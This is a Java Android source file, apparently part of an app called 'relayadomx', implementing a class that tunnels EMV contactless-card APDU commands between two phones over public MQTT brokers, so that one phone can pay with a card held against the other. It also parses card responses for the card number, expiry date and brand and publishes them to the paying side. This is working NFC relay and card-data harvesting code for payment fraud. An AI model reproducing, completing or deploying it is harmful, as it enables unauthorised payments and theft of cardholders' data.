package com.relayadomx;

import org.eclipse.paho.client.mqttv3.IMqttActionListener;
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.IMqttToken;
import org.eclipse.paho.client.mqttv3.MqttAsyncClient;
import org.eclipse.paho.client.mqttv3.MqttCallbackExtended;
import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
import org.eclipse.paho.client.mqttv3.MqttMessage;
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;

import java.util.Arrays;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

/** Túnel entre el teléfono que paga y el que tiene la tarjeta. */
public final class Remoto implements MqttCallbackExtended {

    public interface Enlace {
        void onServidor(int estado, String texto);
        void onPar(boolean enlazado);
        void onTarjetaRemota(boolean lista);
        void onTarjetaDatos(String marca, String pan, String venc);
        void onResultado(int estado);
        void onAviso(String s);
    }

    public interface Log { void onLog(String s); }

    public static final Remoto I = new Remoto();
    public static volatile Log registro;

    public static final int APAGADO = 0;
    public static final int CONECTANDO = 1;
    public static final int CONECTADO = 2;
    public static final int SIN_SERVIDOR = 3;

    private static final String[] BROKERS = {
            "tcp://broker.hivemq.com:1883",
            "tcp://broker.emqx.io:1883",
            "tcp://test.mosquitto.org:1883",
            "tcp://mqtt.eclipseprojects.io:1883",
            "ssl://broker.emqx.io:8883",
            "ssl://test.mosquitto.org:8883"
    };

    private static final long VIGENCIA_PAR = 4000;
    private static final long VIGENCIA_TARJETA = 6000;
    private static final long ESPERA_ENLACE = 14000;

    private MqttAsyncClient cli;
    private String base;
    private String id;
    private volatile boolean pagar;
    private volatile boolean tunel;
    private volatile boolean activo;
    private volatile boolean par;
    private volatile boolean tarjetaLocal;
    private volatile int generacion;
    private volatile int indice;
    private volatile int intento;
    private volatile long ultimoPar;
    private volatile long ultimaTarjeta;
    private volatile long desde;
    private volatile boolean latiendo;
    private Lector lector;
    private Enlace enlace;
    private String aid = "";
    private String datosEnviados = "";
    private final LinkedBlockingQueue<String> respuestas = new LinkedBlockingQueue<>();
    private final ExecutorService colaTarjeta = Executors.newSingleThreadExecutor();
    private final Random azar = new Random();

    private Remoto() { }

    public boolean activo() { return activo; }
    public boolean tunel() { return tunel; }

    public boolean parFresco() {
        return par && System.currentTimeMillis() - ultimoPar < VIGENCIA_PAR;
    }

    public boolean tarjetaRemotaFresca() {
        return System.currentTimeMillis() - ultimaTarjeta < VIGENCIA_TARJETA;
    }

    public void conectar(String codigo, boolean comoPagar, Lector l, Enlace e, String equipo) {
        pagar = comoPagar;
        tunel = true;
        lector = l;
        enlace = e;
        par = false;
        ultimoPar = 0;
        ultimaTarjeta = 0;
        activo = false;
        tarjetaLocal = false;
        intento = 0;
        indice = 0;
        aid = "";
        datosEnviados = "";
        respuestas.clear();
        base = "emvrelay/" + codigo.toLowerCase() + "/";
        id = "eq" + equipo + (pagar ? "a" : "b");
        reg("equipo " + id);
        latir();
        abrir();
    }

    private void abrir() {
        final int gen = ++generacion;
        cerrar();
        activo = false;
        par = false;
        desde = System.currentTimeMillis();
        final String broker = BROKERS[indice];
        final String etiqueta = (indice + 1) + "/" + BROKERS.length;
        avisarServidor(CONECTANDO, "conectando " + etiqueta);
        reg("conectando a " + broker);

        new Thread(() -> {
            MqttAsyncClient c;
            try {
                c = new MqttAsyncClient(broker, id, new MemoryPersistence());
            } catch (Exception e) {
                reintentar(gen, "cliente: " + e.getMessage());
                return;
            }
            MqttConnectOptions o = new MqttConnectOptions();
            o.setCleanSession(true);
            o.setConnectionTimeout(8);
            o.setKeepAliveInterval(30);
            o.setAutomaticReconnect(false);
            c.setCallback(Remoto.this);
            if (gen != generacion) {
                try { c.close(); } catch (Exception ignored) { }
                return;
            }
            cli = c;
            try {
                c.connect(o, null, new IMqttActionListener() {
                    @Override public void onSuccess(IMqttToken t) { }
                    @Override public void onFailure(IMqttToken t, Throwable e) {
                        reintentar(gen, e == null ? "?" : e.getMessage());
                    }
                });
            } catch (Exception e) {
                reintentar(gen, e.getMessage());
            }
        }, "mqtt-conectar").start();
    }

    private void reintentar(int gen, String motivo) {
        if (gen != generacion || !tunel) return;
        intento++;
        long espera = Math.min(1500L * intento, 8000L);
        reg("fallo: " + motivo + " · reintento en " + espera + " ms");
        avisarServidor(SIN_SERVIDOR, "sin servidor");
        new Thread(() -> {
            try { Thread.sleep(espera); } catch (InterruptedException e) { return; }
            if (gen != generacion || !tunel) return;
            indice = (indice + 1) % BROKERS.length;
            abrir();
        }, "mqtt-espera").start();
    }

    public void tarjetaLocal(boolean lista) {
        if (tarjetaLocal == lista) return;
        tarjetaLocal = lista;
        publicar("c", lista ? "1" : "0");
    }

    /** 0 en espera, 1 en curso, 2 aprobada, 3 no concluida. */
    public void resultado(int estado) {
        if (!pagar) return;
        publicar("k", String.valueOf(estado));
    }

    public void desconectar() {
        generacion++;
        tunel = false;
        latiendo = false;
        activo = false;
        par = false;
        respuestas.clear();
        cerrar();
        avisarServidor(APAGADO, "apagado");
    }

    private void cerrar() {
        MqttAsyncClient c = cli;
        cli = null;
        if (c == null) return;
        try { c.disconnectForcibly(150, 150); } catch (Exception ignored) { }
        try { c.close(); } catch (Exception ignored) { }
    }

    private void publicar(String sufijo, String texto) {
        MqttAsyncClient c = cli;
        if (c == null || !activo) return;
        try {
            c.publish(base + sufijo, texto.getBytes(), 0, false, null, null);
        } catch (Exception e) {
            reg("publicar " + sufijo + " falló: " + e.getMessage());
        }
    }

    public byte[] enviar(byte[] apdu, int ms) {
        long limite = System.currentTimeMillis() + 900;
        while (!activo && System.currentTimeMillis() < limite) {
            try { Thread.sleep(30); } catch (InterruptedException e) { break; }
        }
        MqttAsyncClient c = cli;
        if (!activo || c == null) {
            reg("< 6F00 · sin enlace");
            return new byte[] { 0x6F, 0x00 };
        }
        long t0 = System.currentTimeMillis();
        respuestas.clear();
        try {
            c.publish(base + "q", Aprendiz.hex(apdu).getBytes(), 0, false, null, null);
        } catch (Exception e) {
            reg("< 6F00 · error al publicar");
            return new byte[] { 0x6F, 0x00 };
        }
        try {
            String r = respuestas.poll(ms, TimeUnit.MILLISECONDS);
            long dt = System.currentTimeMillis() - t0;
            if (r == null) {
                reg("< SIN RESPUESTA · " + dt + " ms");
                return new byte[] { 0x6F, 0x00 };
            }
            reg("< " + r + " · " + dt + " ms");
            return Aprendiz.dehex(r);
        } catch (InterruptedException e) {
            return new byte[] { 0x6F, 0x00 };
        }
    }

    @Override public void connectComplete(boolean reconexion, String uri) {
        final MqttAsyncClient c = cli;
        if (c == null) return;
        final boolean recon = reconexion;
        try {
            c.subscribe(base + "#", 0, null, new IMqttActionListener() {
                @Override public void onSuccess(IMqttToken t) {
                    activo = true;
                    intento = 0;
                    desde = System.currentTimeMillis();
                    avisarServidor(CONECTADO, "conectado " + (indice + 1) + "/" + BROKERS.length);
                    avisar(recon ? "reconectado" : "conectado");
                    publicarSaludo();
                }
                @Override public void onFailure(IMqttToken t, Throwable e) {
                    String m = e == null ? "?" : e.getMessage();
                    avisarServidor(SIN_SERVIDOR, "suscripción rechazada");
                    reg("suscripción falló: " + m);
                }
            });
        } catch (Exception e) {
            avisarServidor(SIN_SERVIDOR, "suscripción falló");
            reg("suscripción falló: " + e.getMessage());
        }
    }

    private void publicarSaludo() {
        if (!activo) return;
        publicar("h/" + (pagar ? "a" : "b"), id);
    }

    private void latir() {
        if (latiendo) return;
        latiendo = true;
        Thread t = new Thread(() -> {
            while (latiendo && tunel) {
                try { Thread.sleep(1500); } catch (InterruptedException e) { return; }
                if (!latiendo || !tunel) return;
                if (!activo) continue;
                publicarSaludo();
                if (!pagar) publicar("c", tarjetaLocal ? "1" : "0");
                long ahora = System.currentTimeMillis();
                if (par && ahora - ultimoPar > VIGENCIA_PAR) {
                    par = false;
                    avisarPar(false);
                    avisar("enlace perdido");
                }
                if (!par && ahora - desde > ESPERA_ENLACE) {
                    desde = ahora;
                    avisar("el otro teléfono no aparece");
                    indice = (indice + 1) % BROKERS.length;
                    abrir();
                }
            }
        }, "mqtt-latido");
        t.setDaemon(true);
        t.start();
    }

    @Override public void messageArrived(String tema, MqttMessage m) {
        if (tema == null || base == null || !tema.startsWith(base)) return;
        final String t = tema.substring(base.length());
        final String p = new String(m.getPayload());
        boolean propio = p.equals(id);
        reg("recv " + t + " = " + p + (propio ? "  [eco]" : "  [DEL OTRO]"));
        if (t.startsWith("h/")) {
            if (propio) return;
            if ((pagar && t.equals("h/b")) || (!pagar && t.equals("h/a"))) {
                ultimoPar = System.currentTimeMillis();
                if (!par) {
                    par = true;
                    avisarPar(true);
                    avisar("enlazado");
                }
            }
            return;
        }
        if (t.equals("c")) {
            if (pagar && !propio) {
                ultimaTarjeta = System.currentTimeMillis();
                avisarTarjetaRemota("1".equals(p));
            }
            return;
        }
        if (t.equals("k")) {
            if (propio || pagar) return;
            int n;
            try {
                n = Integer.parseInt(p.trim());
            } catch (Exception e) {
                return;
            }
            avisarResultado(n);
            return;
        }
        if (t.equals("d")) {
            if (pagar && !propio) {
                String[] partes = p.split("\\|");
                if (partes.length >= 3) avisarTarjetaDatos(partes[0], partes[1], partes[2]);
            }
            return;
        }
        if (t.equals("q") && !pagar && !propio) {
            colaTarjeta.execute(() -> atender(p));
            return;
        }
        if (t.equals("r") && pagar && !propio) respuestas.offer(p);
    }

    private void atender(String p) {
        long t0 = System.currentTimeMillis();
        byte[] apdu = Aprendiz.dehex(p);
        reg("> " + p);
        byte[] resp = lector == null
                ? new byte[] { 0x6A, (byte) 0x82 }
                : lector.enviar(apdu);
        long dt = System.currentTimeMillis() - t0;
        reg("< " + Aprendiz.hex(resp) + " · " + dt + " ms");
        publicar("r", Aprendiz.hex(resp));
        analizar(apdu, resp);
    }

    private void analizar(byte[] apdu, byte[] resp) {
        try {
            if (apdu.length > 5 && (apdu[1] & 0xff) == 0xA4) {
                int len = apdu[4] & 0xff;
                int desdeAid = 5;
                int hasta = Math.min(apdu.length - 2, desdeAid + len);
                if (hasta > desdeAid) aid = Aprendiz.hex(Arrays.copyOfRange(apdu, desdeAid, hasta));
            }
            String pan = null;
            String venc = null;
            String p57 = valorTag(resp, 0x57, 16, 20);
            String p5a = valorTag(resp, 0x5A, 6, 10);
            if (p57 != null) {
                int d = p57.indexOf('D');
                if (d < 0) d = p57.indexOf('d');
                if (d > 0) {
                    pan = soloDigitos(p57.substring(0, d));
                    String resto = p57.substring(d + 1);
                    if (resto.length() >= 4) venc = resto.substring(2, 4) + "/" + resto.substring(0, 2);
                }
            }
            if (pan == null && p5a != null) pan = soloDigitos(p5a);
            if (pan == null || pan.length() < 12) return;
            String marca = marca(pan, aid);
            String nuevo = marca + "|" + pan + "|" + (venc == null ? "" : venc);
            if (nuevo.equals(datosEnviados)) return;
            datosEnviados = nuevo;
            publicar("d", nuevo);
            avisarTarjetaDatos(marca, pan, venc);
            reg("tarjeta: " + marca + " " + pan + " " + (venc == null ? "" : venc));
        } catch (Exception e) {
            reg("analizar falló: " + e.getMessage());
        }
    }

    private static String valorTag(byte[] datos, int tag, int min, int max) {
        for (int i = 0; i + 1 < datos.length; i++) {
            if ((datos[i] & 0xff) != tag) continue;
            int len = datos[i + 1] & 0xff;
            if (len >= min && len <= max && i + 2 + len <= datos.length) {
                StringBuilder sb = new StringBuilder();
                for (int j = i + 2; j < i + 2 + len; j++) sb.append((char) (datos[j] & 0xff));
                return sb.toString();
            }
        }
        return null;
    }

    private static String soloDigitos(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c >= '0' && c <= '9') sb.append(c);
        }
        return sb.toString();
    }

    private static String marca(String pan, String aid) {
        if (aid != null) {
            if (aid.startsWith("A000000004") || aid.startsWith("A000000005")) return "MASTERCARD";
            if (aid.startsWith("A000000003")) return "VISA";
            if (aid.startsWith("A000000025")) return "AMEX";
            if (aid.startsWith("A000000065")) return "JCB";
            if (aid.startsWith("A000000152")) return "DISCOVER";
        }
        if (pan.startsWith("4")) return "VISA";
        if (pan.startsWith("34") || pan.startsWith("37")) return "AMEX";
        int p2 = Integer.parseInt(pan.substring(0, 2));
        if (p2 >= 51 && p2 <= 55) return "MASTERCARD";
        if (pan.startsWith("50") || pan.startsWith("56") || pan.startsWith("57")
                || pan.startsWith("58") || pan.startsWith("6")) return "MAESTRO";
        return "TARJETA";
    }

    @Override public void connectionLost(Throwable c) {
        activo = false;
        par = false;
        avisarPar(false);
        avisarServidor(SIN_SERVIDOR, "sin servidor");
        avisar("red perdida");
        final int gen = generacion;
        new Thread(() -> {
            try { Thread.sleep(1000); } catch (InterruptedException e) { return; }
            if (gen != generacion || !tunel) return;
            reintentar(gen, "conexión perdida");
        }, "mqtt-espera").start();
    }

    @Override public void deliveryComplete(IMqttDeliveryToken t) { }

    private void avisar(String s) {
        Enlace e = enlace;
        if (e != null) e.onAviso(s);
    }

    private void avisarServidor(int estado, String s) {
        Enlace e = enlace;
        if (e != null) e.onServidor(estado, s);
    }

    private void avisarPar(boolean v) {
        Enlace e = enlace;
        if (e != null) e.onPar(v);
    }

    private void avisarTarjetaRemota(boolean v) {
        Enlace e = enlace;
        if (e != null) e.onTarjetaRemota(v);
    }

    private void avisarTarjetaDatos(String marca, String pan, String venc) {
        Enlace e = enlace;
        if (e != null) e.onTarjetaDatos(marca, pan, venc);
    }

    private void avisarResultado(int estado) {
        Enlace e = enlace;
        if (e != null) e.onResultado(estado);
    }

    private static void reg(String s) {
        Log l = registro;
        if (l != null) l.onLog(s);
    }
}